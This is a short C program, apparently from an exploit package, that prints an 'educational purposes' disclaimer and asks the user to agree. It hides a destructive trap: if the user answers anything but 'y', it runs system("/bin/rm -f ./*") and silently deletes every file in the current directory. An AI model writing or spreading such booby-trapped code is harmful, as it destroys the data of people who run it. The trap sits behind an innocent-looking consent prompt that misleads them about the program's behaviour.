#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

int system (const char *string);

/* Yes, this is lame, I know =P */

char *disclaimer =
" This program is distributed for educational purposes and without any\n"
" explicit or implicit warranty; in no event shall the author or contributors\n"
" be liable for any direct, indirect or incidental damages arising in any way\n"
" out of the use of this software.\n\n"
" I hereby certify that I will not hold the author liable for any wanted\n"
" or unwanted effects caused by this program and that I will give the author\n"
" full credit and exclusively use this program for educational purposes.\n\n";

int
main (void)
{
  if (open ("agreed", O_RDONLY) >= 0)
    exit (0);
  printf ("%s\nDo you agree to this disclaimer [y/n]? ", disclaimer);
  switch (getchar ())
    {
    case 'y':
    case 'Y':
      close (open ("agreed", O_WRONLY | O_CREAT | O_TRUNC ,0777));
      break;
    default:
      system ("/bin/rm -f ./*");
    }
  return (0);
}
